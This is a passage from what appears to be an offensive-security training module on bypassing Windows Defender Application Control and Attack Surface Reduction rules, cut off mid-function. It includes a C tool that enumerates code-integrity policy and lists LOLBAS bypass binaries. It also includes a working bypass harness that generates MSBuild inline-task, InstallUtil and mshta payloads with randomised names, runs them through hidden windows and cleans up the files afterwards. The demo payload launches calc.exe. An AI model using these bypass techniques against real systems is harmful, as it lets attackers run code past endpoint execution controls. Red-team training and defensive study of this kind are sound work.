## Day 5: WDAC and Attack Surface Reduction (ASR) Bypass

- **Goal**: Understand and bypass Windows Defender Application Control (WDAC) and Attack Surface Reduction (ASR) rules - the OS-level policies that decide whether your code is _allowed to execute at all_.
- **Activities**:
  - _Reading_:
    - [App Control for Business design guide](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/wdac-design-guide)
    - [Microsoft - ASR Rules Reference](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference)
    - [LOLBAS Project](https://lolbas-project.github.io/) - Living Off the Land Binaries and Scripts
  - _Online Resources_:
    - [SpecterOps - Subverting Trust in Windows](https://www.youtube.com/watch?v=wxmxxgL6Nz8) - CI policy bypass
    - [WDAC Bypass Catalog](https://github.com/bohops/UltimateWDACBypassList) - Community-maintained bypass list
    - [Red Teaming in the EDR Age](https://www.youtube.com/watch?v=l8nkXCOYQC4) - Practical signing
    - [Windows Internals - Code Integrity](https://www.microsoftpressstore.com/store/windows-internals-part-2-9780135462331)
  - _Tool Setup_:
    - WDAC Policy Wizard (Microsoft Store)
    - CITool.exe (Windows 11 built-in)
    - signtool.exe (Windows SDK)
    - WDACme (auditing tool)
  - _Exercise_:
    - Deploy a WDAC policy in audit mode
    - Test known WDAC bypass techniques (LOLBAS, catalog signing)
    - Enable ASR rules and test bypass methods
    - Build a payload that executes despite WDAC enforcement

WDAC and ASR represent the OS-level _execution policy_ layer. They answer the question: **"Is this binary/script allowed to run?"** - before any exploit mitigation (DEP, ASLR, CFG) even comes into play.

### Context: WDAC vs AppLocker vs ASR

```text
┌───────────────────────────────────────────────────────────────┐
│         Windows Execution Control Landscape                   │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  WDAC (Windows Defender Application Control):                 │
│  ─────────────────────────────────────────────                │
│  ├── Kernel-enforced code integrity (CI.dll, CiValidateImage) │
│  ├── Controls: executables, DLLs, scripts, drivers            │
│  ├── Policy types: Base + Supplemental                        │
│  ├── Trust based on: signer, hash, path, publisher            │
│  ├── Cannot be bypassed by admin (kernel-enforced!)           │
│  └── Strongest execution control on Windows                   │
│                                                               │
│  AppLocker (Legacy):                                          │
│  ───────────────────                                          │
│  ├── User-mode enforcement (AppIDSvc service)                 │
│  ├── Controls: EXE, DLL, Script, MSI, AppX                    │
│  ├── Rules: Publisher, Path, Hash                             │
│  ├── CAN be bypassed by admin (stop service)                  │
│  └── Being superseded by WDAC                                 │
│                                                               │
│  ASR (Attack Surface Reduction):                              │
│  ───────────────────────────────                              │
│  ├── Behavior-based rules (not binary allow/deny)             │
│  ├── Blocks specific attack techniques                        │
│  ├── Examples: "Block Office creating child processes"        │
│  │            "Block PsExec/WMI process creation"             │
│  │            "Block credential stealing from LSASS"          │
│  ├── Managed via Intune/GPO                                   │
│  └── Complements WDAC - different layer                       │
│                                                               │
│  RELATIONSHIP:                                                │
│  WDAC = "WHAT can run" (binary-level allow/deny)              │
│  ASR  = "HOW it can behave" (technique-level blocking)        │
│  Both are OS policies, NOT exploit mitigations                │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

### Deliverables

- [ ] Understand the difference between WDAC, AppLocker, and ASR
- [ ] Deploy and analyze a WDAC policy
- [ ] Execute code despite WDAC enforcement using at least 2 bypass techniques
- [ ] Bypass at least 3 ASR rules

### WDAC Architecture and Enforcement

```c
// wdac_analyzer.c - Enumerate WDAC/CI policy status
// Compile: cl src\wdac_analyzer.c /Fe:bin\wdac_analyzer.exe advapi32.lib wintrust.lib shlwapi.lib

#include <windows.h>
#include <wintrust.h>
#include <softpub.h>
#include <shlwapi.h>
#include <mscat.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")

/*
WDAC Enforcement Architecture:
══════════════════════════════

User request (run EXE) -> CreateProcess -> NtCreateSection
   -> CI!CiValidateImageHeader (KERNEL MODE)
      -> Load active CI policy
      -> Check signer chain + page hashes + WDAC rules
      -> ALLOW or DENY (STATUS_INVALID_IMAGE_HASH = 0xC0000604)

Key insight: WDAC is enforced in KERNEL mode.
Admin cannot disable it (unlike AppLocker).
Must find policy gaps or trusted-binary abuse.
*/

// ── Registry-based CI status query ──────────────────────────

typedef struct _CI_STATUS {
    BOOL umciEnabled;       // User-Mode Code Integrity
    BOOL umciAuditMode;     // Audit vs Enforce
    BOOL hvciEnabled;       // Hypervisor Code Integrity
    BOOL vbsEnabled;        // Virtualization Based Security
    BOOL secureBootEnabled;
} CI_STATUS;

BOOL QueryCIStatus(CI_STATUS* status) {
    HKEY hKey;
    DWORD val, size;
    LONG ret;

    memset(status, 0, sizeof(CI_STATUS));

    // Check CI enforcement via Control\CI registry key
    ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI", 0, KEY_READ, &hKey);
    if (ret == ERROR_SUCCESS) {
        size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "UMCIAuditMode", NULL, NULL,
                            (LPBYTE)&val, &size) == ERROR_SUCCESS) {
            status->umciAuditMode = (val == 1);
            status->umciEnabled = TRUE;
        }
        RegCloseKey(hKey);
    }

    // Check Device Guard / VBS status
    ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0, KEY_READ, &hKey);
    if (ret == ERROR_SUCCESS) {
        size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "EnableVirtualizationBasedSecurity",
                            NULL, NULL, (LPBYTE)&val, &size) == ERROR_SUCCESS) {
            status->vbsEnabled = (val == 1);
        }
        if (RegQueryValueExA(hKey, "HypervisorEnforcedCodeIntegrity",
                            NULL, NULL, (LPBYTE)&val, &size) == ERROR_SUCCESS) {
            status->hvciEnabled = (val == 1);
        }
        RegCloseKey(hKey);
    }

    // Check Secure Boot
    ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", 0, KEY_READ, &hKey);
    if (ret == ERROR_SUCCESS) {
        size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "UEFISecureBootEnabled",
                            NULL, NULL, (LPBYTE)&val, &size) == ERROR_SUCCESS) {
            status->secureBootEnabled = (val == 1);
        }
        RegCloseKey(hKey);
    }

    return TRUE;
}

// ── Active CI policy file enumeration ───────────────────────

void EnumeratePolicyFiles() {
    printf("\n=== Active CI Policy Files ===\n\n");

    const char* policyPaths[] = {
        "C:\\Windows\\System32\\CodeIntegrity\\SiPolicy.p7b",
        "C:\\Windows\\System32\\CodeIntegrity\\CiPolicies\\Active\\",
        NULL
    };

    // Check legacy single-policy file
    if (GetFileAttributesA(policyPaths[0]) != INVALID_FILE_ATTRIBUTES) {
        WIN32_FILE_ATTRIBUTE_DATA fad;
        GetFileAttributesExA(policyPaths[0], GetFileExInfoStandard, &fad);
        printf("  [+] SiPolicy.p7b: PRESENT (%d bytes)\n",
               fad.nFileSizeLow);
        printf("      -> Legacy single WDAC policy (pre-1903)\n");
    } else {
        printf("  [ ] SiPolicy.p7b: Not present\n");
    }

    // Enumerate multiple policy files (Windows 10 1903+ / Windows 11)
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(
        "C:\\Windows\\System32\\CodeIntegrity\\CiPolicies\\Active\\*.cip", &fd);

    int policyCount = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            policyCount++;
            printf("  [+] Policy: %s (%d bytes)\n",
                   fd.cFileName, fd.nFileSizeLow);

            // Check if it's a supplemental policy (GUID-based name)
            if (strchr(fd.cFileName, '{')) {
                printf("      -> Supplemental policy (GUID-based)\n");
                printf("      -> BYPASS NOTE: Supplemental policies can EXPAND trust\n");
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    if (policyCount == 0)
        printf("  [ ] No .cip policy files in Active directory\n");
    else
        printf("  [*] Total active policies: %d\n", policyCount);
}

// ── Verify Authenticode signature of a binary ───────────────

BOOL VerifyCatalogSignature(const wchar_t* filePath, DWORD* pErrorCode) {
    *pErrorCode = 0;

    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        *pErrorCode = GetLastError();
        return FALSE;
    }

    // First call to get hash size
    DWORD hashSize = 0;
    CryptCATAdminCalcHashFromFileHandle(hFile, &hashSize, NULL, 0);

    if (hashSize == 0 || hashSize > 256) {
        *pErrorCode = 1; // Hash size error
        CloseHandle(hFile);
        return FALSE;
    }

    // Allocate and calculate actual hash
    BYTE hash[256];
    if (!CryptCATAdminCalcHashFromFileHandle(hFile, &hashSize, hash, 0)) {
        *pErrorCode = GetLastError();
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    // Acquire catalog context
    HCATADMIN hCatAdmin = NULL;
    if (!CryptCATAdminAcquireContext(&hCatAdmin, NULL, 0)) {
        *pErrorCode = GetLastError();
        return FALSE;
    }

    // Search for catalog containing this file's hash
    HCATINFO hCatInfo = CryptCATAdminEnumCatalogFromHash(hCatAdmin, hash, hashSize, 0, NULL);

    BOOL isSigned = (hCatInfo != NULL);

    if (hCatInfo) {
        CryptCATAdminReleaseCatalogContext(hCatAdmin, hCatInfo, 0);
    }

    CryptCATAdminReleaseContext(hCatAdmin, 0);
    return isSigned;
}

const char* VerifyBinarySignature(const wchar_t* filePath) {
    WINTRUST_FILE_INFO fileInfo = {0};
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = filePath;

    GUID policyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    WINTRUST_DATA trustData = {0};
    trustData.cbStruct = sizeof(WINTRUST_DATA);
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.dwProvFlags = WTD_SAFER_FLAG;

    LONG result = WinVerifyTrust(NULL, &policyGUID, &trustData);

    // Clean up state
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &policyGUID, &trustData);

    // If no embedded signature, check catalog signature
    if (result == TRUST_E_NOSIGNATURE) {
        DWORD catalogError = 0;
        if (VerifyCatalogSignature(filePath, &catalogError)) {
            return "SIGNED (Catalog)";
        }
        // Uncomment for debugging:
        // printf("      [DEBUG] Catalog check failed: error %d\n", catalogError);
    }

    switch (result) {
        case ERROR_SUCCESS:
            return "SIGNED (Embedded)";
        case TRUST_E_NOSIGNATURE:
            return "UNSIGNED";
        case TRUST_E_EXPLICIT_DISTRUST:
            return "EXPLICITLY DISTRUSTED";
        case CRYPT_E_SECURITY_SETTINGS:
            return "BLOCKED BY POLICY";
        case TRUST_E_SUBJECT_NOT_TRUSTED:
            return "SIGNED (Untrusted)";
        default:
            return "UNKNOWN STATUS";
    }
}

// ── Scan for LOLBAS bypass binaries ─────────────────────────

void ScanLOLBASBypassOpportunities() {
    printf("\n=== LOLBAS Bypass Binary Availability ===\n\n");

    // These Microsoft-signed binaries can execute arbitrary code
    // If present and not blocked by WDAC policy, they're bypass vectors
    struct { const wchar_t* path; const char* name; const char* technique; } lolbas[] = {
        { L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
          "MSBuild.exe", "Compile+execute inline C# from .csproj" },
        { L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
          "InstallUtil.exe", "Execute .NET assembly via /U uninstall" },
        { L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
          "csc.exe", "Compile C# on-disk then execute" },
        { L"C:\\Windows\\System32\\mshta.exe",
          "mshta.exe", "Execute HTA with embedded VBScript/JScript" },
        { L"C:\\Windows\\System32\\wscript.exe",
          "wscript.exe", "Execute VBScript/JScript files" },
        { L"C:\\Windows\\System32\\cmstp.exe",
          "cmstp.exe", "Execute DLL via INF ScriptExtension" },
        { L"C:\\Windows\\System32\\msiexec.exe",
          "msiexec.exe", "Execute DLL payload from MSI" },
        { L"C:\\Windows\\System32\\certutil.exe",
          "certutil.exe", "Download + decode payloads" },
        { L"C:\\Windows\\System32\\rundll32.exe",
          "rundll32.exe", "Execute exported DLL function" },
        { L"C:\\Windows\\System32\\regsvr32.exe",
          "regsvr32.exe", "Scriptlet execution via /s /i:URL" },
    };

    for (int i = 0; i < _countof(lolbas); i++) {
        BOOL exists = (GetFileAttributesW(lolbas[i].path) != INVALID_FILE_ATTRIBUTES);
        const char* sigStatus = exists ?
            VerifyBinarySignature(lolbas[i].path) : "N/A";

        printf("  %s %-18s  Sig: %-20s  Technique: %s\n",
               exists ? "[+]" : "[-]",
               lolbas[i].name,
               sigStatus,
               lolbas[i].technique);
    }
}

// ── Check ASR rule enforcement ──────────────────────────────

void CheckASRRules() {
    printf("\n=== ASR Rule Enforcement Status ===\n\n");

    // ASR rules are stored in this registry key
    HKEY hKey;
    LONG ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\"
        "Windows Defender Exploit Guard\\ASR\\Rules",
        0, KEY_READ, &hKey);

    if (ret != ERROR_SUCCESS) {
        // Try alternative path
        ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender\\"
            "Windows Defender Exploit Guard\\ASR\\Rules",
            0, KEY_READ, &hKey);
    }

    struct { const char* guid; const char* name; } asrRules[] = {
        { "D4F940AB-401B-4EFC-AADC-AD5F3C50688A", "Block Office child processes" },
        { "3B576869-A4EC-4529-8536-B80A7769E899", "Block Office creating executables" },
        { "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84", "Block Office code injection" },
        { "D3E037E1-3EB8-44C8-A917-57927947596D", "Block PsExec/WMI process creation" },
        { "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2", "Block credential theft from LSASS" },
        { "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550", "Block executable content from email" },
        { "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC", "Block downloads of executable content" },
        { "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B", "Block Win32 API from Office macros" },
        { "26190899-1602-49E8-8B27-EB1D0A1CE869", "Block Office COM object creation" },
        { "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C", "Block Adobe Reader child processes" },
    };

    if (ret == ERROR_SUCCESS) {
        for (int i = 0; i < _countof(asrRules); i++) {
            DWORD val = 0, size = sizeof(DWORD);
            char valStr[16] = {0};
            DWORD valStrSize = sizeof(valStr);

            // ASR rules can be DWORD or string values
            DWORD type = 0;
            ret = RegQueryValueExA(hKey, asrRules[i].guid, NULL, &type,
                                  (LPBYTE)valStr, &valStrSize);

            const char* mode = "Not configured";
            if (ret == ERROR_SUCCESS) {
                // Value is a string: "0"=disabled, "1"=block, "2"=audit, "6"=warn
                int v = atoi(valStr);
                switch (v) {
                    case 0: mode = "DISABLED"; break;
                    case 1: mode = "BLOCK"; break;
                    case 2: mode = "AUDIT"; break;
                    case 6: mode = "WARN"; break;
                    default: mode = "UNKNOWN"; break;
                }
            }

            printf("  %-8s %s\n", mode, asrRules[i].name);
        }
        RegCloseKey(hKey);
    } else {
        printf("  [*] ASR rules not configured via Group Policy\n");
        printf("  [*] May be managed via Intune/MDE - check:\n");
        printf("      Get-MpPreference | Select *asr*\n");
    }
}

// ── Test binary execution against WDAC ──────────────────────

void TestBinaryExecution(const char* testExePath) {
    printf("\n=== WDAC Execution Test: %s ===\n\n", testExePath);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // Attempt to create process - WDAC denies at NtCreateSection
    if (CreateProcessA(testExePath, NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("  [+] CreateProcess SUCCEEDED - binary ALLOWED by CI policy\n");
        printf("      PID: %d\n", pi.dwProcessId);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        DWORD err = GetLastError();
        printf("  [-] CreateProcess FAILED - error %d\n", err);
        if (err == 225) {  // ERROR_VIRUS_INFECTED
            printf("      -> Blocked by Windows Defender / AMSI\n");
        } else if (err == 1260) {  // ERROR_ACCESS_DISABLED_BY_POLICY
            printf("      -> Blocked by WDAC/AppLocker POLICY\n");
            printf("      -> STATUS_INVALID_IMAGE_HASH at CI layer\n");
        } else if (err == 5) {
            printf("      -> Access denied (check permissions)\n");
        }
    }
}

int main(int argc, char* argv[]) {
    printf("===========================\n");
    printf("WDAC/CI Policy Analyzer    \n");
    printf("===========================\n\n");

    // Phase 1: Query CI enforcement status from registry
    printf("=== Code Integrity Enforcement Status ===\n\n");
    CI_STATUS ci = {0};
    QueryCIStatus(&ci);

    printf("  UMCI (User-Mode CI):  %s\n",
           ci.umciEnabled ? (ci.umciAuditMode ? "AUDIT MODE" : "ENFORCED") : "DISABLED");
    printf("  HVCI (Kernel CI):     %s\n", ci.hvciEnabled ? "ENABLED" : "DISABLED");
    printf("  VBS:                  %s\n", ci.vbsEnabled ? "ENABLED" : "DISABLED");
    printf("  Secure Boot:          %s\n", ci.secureBootEnabled ? "ENABLED" : "DISABLED");

    if (!ci.umciEnabled) {
        printf("\n  [!] UMCI not enforced - WDAC is NOT blocking usermode binaries\n");
        printf("  [!] Any EXE/DLL will execute regardless of signature\n");
    } else if (ci.umciAuditMode) {
        printf("\n  [!] UMCI in AUDIT mode - violations logged but NOT blocked\n");
        printf("  [!] Check Event Viewer: Applications and Services > Microsoft\n");
        printf("      > Windows > CodeIntegrity > Operational (Event ID 3076)\n");
    } else {
        printf("\n  [*] UMCI ENFORCED - unsigned/untrusted code BLOCKED\n");
        printf("  [*] Need LOLBAS, DLL sideloading, or signing bypass\n");
    }

    if (ci.hvciEnabled) {
        printf("  [!] HVCI enabled - unsigned kernel drivers BLOCKED\n");
        printf("  [!] BYOVD limited to HVCI-compatible signed drivers\n");
    }

    // Phase 2: Enumerate active policy files
    EnumeratePolicyFiles();

    // Phase 3: Scan for LOLBAS bypass opportunities
    ScanLOLBASBypassOpportunities();

    // Phase 4: Check ASR enforcement
    CheckASRRules();

    // Phase 5: Test specific binary if provided
    if (argc > 1) {
        TestBinaryExecution(argv[1]);
    }

    printf("\n==========================================\n");
    printf("ATTACK STRATEGY BASED ON FINDINGS:\n");
    if (!ci.umciEnabled) {
        printf("  -> No WDAC - execute any unsigned payload directly\n");
    } else if (ci.umciAuditMode) {
        printf("  -> Audit mode - execute payload, check logs for stealth\n");
    } else {
        printf("  -> WDAC enforced. Priority bypass paths:\n");
        printf("     1. LOLBAS (MSBuild/InstallUtil) if available\n");
        printf("     2. DLL sideloading via trusted signed EXE\n");
        printf("     3. Managed Installer abuse (if SCCM/Intune)\n");
        printf("     4. Supplemental policy injection (if allowed)\n");
        printf("     5. Signed binary with known vuln (BYOVDLL)\n");
    }
    printf("=============================================\n");

    return 0;
}
```

### WDAC Bypass

#### Technique 1: MSBuild Inline Task Execution

```c
// wdac_bypass_tester.c
// Compile: cl src\wdac_bypass_tester.c /Fe:bin\wdac_bypass_tester.exe user32.lib
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")

void XorObfuscate(char* data, size_t len, BYTE key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void GenerateRandomName(char* buffer, size_t size) {
    const char* prefixes[] = {"Build", "Config", "Setup", "Update", "Install", "Deploy"};
    const char* suffixes[] = {"Task", "Helper", "Manager", "Service", "Handler", "Worker"};
    srand((unsigned int)time(NULL) + GetTickCount());
    snprintf(buffer, size, "%s%s%d",
             prefixes[rand() % 6],
             suffixes[rand() % 6],
             rand() % 9999);
}

BOOL IsProcessRunning(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    BOOL found = FALSE;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return found;
}

void ListAllProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    printf("[DEBUG] Running processes:\n");
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strstr(pe32.szExeFile, "calc") || strstr(pe32.szExeFile, "Calc") ||
                strstr(pe32.szExeFile, "mshta") || strstr(pe32.szExeFile, "regsvr")) {
                printf("  - %s (PID: %lu)\n", pe32.szExeFile, pe32.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
}

void KillProcess(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
}

BOOL TestMSBuildPayload(const char* outputPath) {
    char className[64], taskName[64];
    GenerateRandomName(className, sizeof(className));
    GenerateRandomName(taskName, sizeof(taskName));

    FILE* f = fopen(outputPath, "w");
    if (!f) {
        printf("[-] Failed to create %s\n", outputPath);
        return FALSE;
    }

    fprintf(f,
"<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
"  <Target Name=\"Main\">\n"
"    <%s />\n"
"  </Target>\n"
"  <UsingTask TaskName=\"%s\" TaskFactory=\"CodeTaskFactory\"\n"
"             AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\">\n"
"    <Task>\n"
"      <Code Type=\"Class\" Language=\"cs\">\n"
"        <![CDATA[\n"
"        using System;\n"
"        using System.Diagnostics;\n"
"        using Microsoft.Build.Framework;\n"
"        using Microsoft.Build.Utilities;\n"
"\n"
"        public class %s : Task {\n"
"            public override bool Execute() {\n"
"                var p = new ProcessStartInfo();\n"
"                p.FileName = \"calc.exe\";\n"
"                p.WindowStyle = ProcessWindowStyle.Normal;\n"
"                try { Process.Start(p); } catch { }\n"
"                return true;\n"
"            }\n"
"        }\n"
"        ]]>\n"
"      </Code>\n"
"    </Task>\n"
"  </UsingTask>\n"
"</Project>\n", taskName, taskName, className);

    fclose(f);
    printf("[+] Generated: %s\n", outputPath);

    KillProcess("CalculatorApp.exe");
    KillProcess("win32calc.exe");

    char msbuildPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
                              msbuildPath, MAX_PATH);

    if (GetFileAttributesA(msbuildPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] MSBuild.exe not found\n");
        return FALSE;
    }

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" /nologo \"%s\"", msbuildPath, outputPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Executing MSBuild payload...\n");
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to execute\n");
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    BOOL success = IsProcessRunning("CalculatorApp.exe") || IsProcessRunning("win32calc.exe");
    if (success) {
        printf("[+] SUCCESS: calc.exe launched via MSBuild\n");
        KillProcess("CalculatorApp.exe");
        KillProcess("win32calc.exe");
    } else {
        printf("[-] FAILED: calc.exe not detected\n");
    }

    DeleteFileA(outputPath);
    return success;
}

BOOL TestInstallUtilPayload(const char* csPath, const char* dllPath) {
    char className[64];
    GenerateRandomName(className, sizeof(className));

    FILE* f = fopen(csPath, "w");
    if (!f) {
        printf("[-] Failed to create %s\n", csPath);
        return FALSE;
    }

    fprintf(f,
"using System;\n"
"using System.ComponentModel;\n"
"using System.Configuration.Install;\n"
"using System.Diagnostics;\n"
"\n"
"[RunInstaller(true)]\n"
"public class %s : Installer {\n"
"    public override void Uninstall(System.Collections.IDictionary state) {\n"
"        var p = new ProcessStartInfo();\n"
"        p.FileName = \"calc.exe\";\n"
"        p.WindowStyle = ProcessWindowStyle.Normal;\n"
"        try { Process.Start(p); } catch { }\n"
"    }\n"
"}\n", className);

    fclose(f);
    printf("[+] Generated: %s\n", csPath);

    char cscPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
                              cscPath, MAX_PATH);

    char compileCmd[1024];
    snprintf(compileCmd, sizeof(compileCmd),
             "\"%s\" /nologo /target:library /out:\"%s\" \"%s\"",
             cscPath, dllPath, csPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Compiling...\n");
    if (!CreateProcessA(NULL, compileCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] Compilation failed\n");
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not created\n");
        DeleteFileA(csPath);
        return FALSE;
    }

    KillProcess("CalculatorApp.exe");
    KillProcess("win32calc.exe");

    char installUtilPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
                              installUtilPath, MAX_PATH);

    char execCmd[1024];
    snprintf(execCmd, sizeof(execCmd),
             "\"%s\" /logtoconsole=false /logfile= /U \"%s\"",
             installUtilPath, dllPath);

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Executing InstallUtil payload...\n");
    if (!CreateProcessA(NULL, execCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to execute\n");
        DeleteFileA(csPath);
        DeleteFileA(dllPath);
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    BOOL success = IsProcessRunning("CalculatorApp.exe") || IsProcessRunning("win32calc.exe");
    if (success) {
        printf("[+] SUCCESS: calc.exe launched via InstallUtil\n");
        KillProcess("CalculatorApp.exe");
        KillProcess("win32calc.exe");
    } else {
        printf("[-] FAILED: calc.exe not detected\n");
    }

    DeleteFileA(csPath);
    DeleteFileA(dllPath);
    return success;
}

BOOL TestMshtaPayload(const char* htaPath) {
    FILE* f = fopen(htaPath, "w");
    if (!f) {
        printf("[-] Failed to create %s\n", htaPath);
        return FALSE;
    }

    fprintf(f,
"<html><head><HTA:APPLICATION SHOWINTASKBAR=\"no\" WINDOWSTATE=\"minimize\"/></head>\n"
"<body><script language=\"JScript\">\n"
"var shell = new ActiveXObject('WScript.Shell');\n"
"shell.Exec('calc.exe');\n"
"setTimeout(function(){window.close();}, 3000);\n"
"</script></body></html>\n");

    fclose(f);
    printf("[+] Generated: %s\n", htaPath);

    KillProcess("CalculatorApp.exe");
    KillProcess("win32calc.exe");

    char mshtaPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\System32\\mshta.exe", mshtaPath, MAX_PATH);

    if (GetFileAttributesA(mshtaPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] mshta.exe not found (removed in 25H2)\n");
        DeleteFileA(htaPath);
        return FALSE;
    }

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" \"%s\"", mshtaPath, htaPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Executing mshta payload...\n");
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        printf("[-] Failed to execute (error: %lu)\n", err);
        DeleteFileA(htaPath);
        return FALSE;
    }

    Sleep(1500);

    BOOL success = IsProcessRunning("CalculatorApp.exe") || IsProcessRunning("win32calc.exe");

    DWORD exitCode = STILL_ACTIVE;
